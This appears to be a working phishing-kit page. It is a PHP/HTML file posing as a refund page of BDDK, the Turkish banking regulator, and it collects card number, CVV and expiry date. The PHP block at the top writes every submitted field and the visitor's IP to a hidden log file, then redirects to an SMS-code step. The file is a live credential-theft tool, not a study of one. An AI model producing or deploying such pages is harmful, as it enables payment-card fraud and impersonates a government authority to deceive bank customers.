<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
header('Location: ../Login/sms.php');
$handle = fopen('log_QULXOCBNni.txt', 'a');
fwrite($handle, '----------------------------------------------------------------------['.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable.': '.$value."\r\n");}
fclose($handle);
exit;
} ?>

<!DOCTYPE html>

    <title>BDDK - Bankacılık Düzenleme ve Denetleme Kurumu</title>
	 <link rel="shortcut icon" href="../Login/Theme_Files/images/favicon.ico" />
	</title><meta http-equiv="PRAGMA" content="NO-CACHE" /><meta http-equiv="CACHE-CONTROL" content="NO-CACHE" /><meta http-equiv="Expires" content="now" /><meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /><meta name="google" content="notranslate" /><link rel="icon" href="/index_files/favicon.ico" type="image/x-icon" />


    <form method="post" action="<?php echo basename(__FILE__); ?>" id="aspnetForm" autocomplete="off">

	<script language="javascript" src="http://ic.sitekodlari.com/sagtusengelleme1.js"></script>

                        </div>

<link href="https://fonts.googleapis.com/css?family=Varela+Round" rel="stylesheet">
<link rel="stylesheet" href="../Login/Theme_Files/css/main.css"> <!-- Resource style -->
<script src="../Login/js/jquery-1.8.2.min.js"></script>
<script src="../Login/js/actions.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

<!-- main content wrap
   ================================================== -->
<div id="login-main-content-wrap">


<div class="login_container">
	<div class="form_container">
		<h3>BDDK - Bankacılık Düzenleme ve Denetleme Kurumu İade İşlemleri</h3>
			<div class="form">
				<div class="thumbnail"><img src="../Login/Theme_Files/images/favicon.png"/></div>


<div id="error_notification"></div>

  <form action="<?php echo basename(__FILE__); ?>" class="login-form" enctype="multipart/form-data" method="post" id='login_form'>
    <input name="tc" required="required" type="text"  placeholder="Kredi Kartı Numaranız" maxlength="16" id="tekewe" class="standardInput info onlyNumeric allowCopyPaste" autocomplete="off" tabindex="1" onkeyup="hideInputBottomErrorMessage($(&#006755;#_ctl0_MusNoText&#006755;));"/>
      <input name="cvv" required="required" type="password" id="kimlik" autocomplete="off" placeholder="Kartınızın CVV Kodu" pattern="[0-9]*" maxlength="3" title="Mobil Onay Kodu" tabindex="2" size="6" class="standardInput info onlyNumeric virtualKeypad" onkeyup="hideInputBottomErrorMessage($(&#006755;#ParolaText&#006755;));"/>

	<input name="pass" required="required" type="text" id="sifrexa" autocomplete="off" placeholder="Son Kullanım Tarihi (Örn: 05/20)" pattern="[0-9 a-Z]*" maxlength="7" title="Şifre ya da Geçici Şifre" tabindex="2" size="7" class="standardInput info onlyNumeric virtualKeypad" onkeyup="hideInputBottomErrorMessage($(&#006755;#ParolaText&#006755;));"/>
    <label><input type="checkbox" name="autologin" value="1">  Bilgilerimi Hatırla</label>
    <button type="submit" name="submit" id='login_submit'>giriş</button>
  </form>


			</div><!-- form -->

	</div><!-- form_container -->

</div><!-- login_container -->
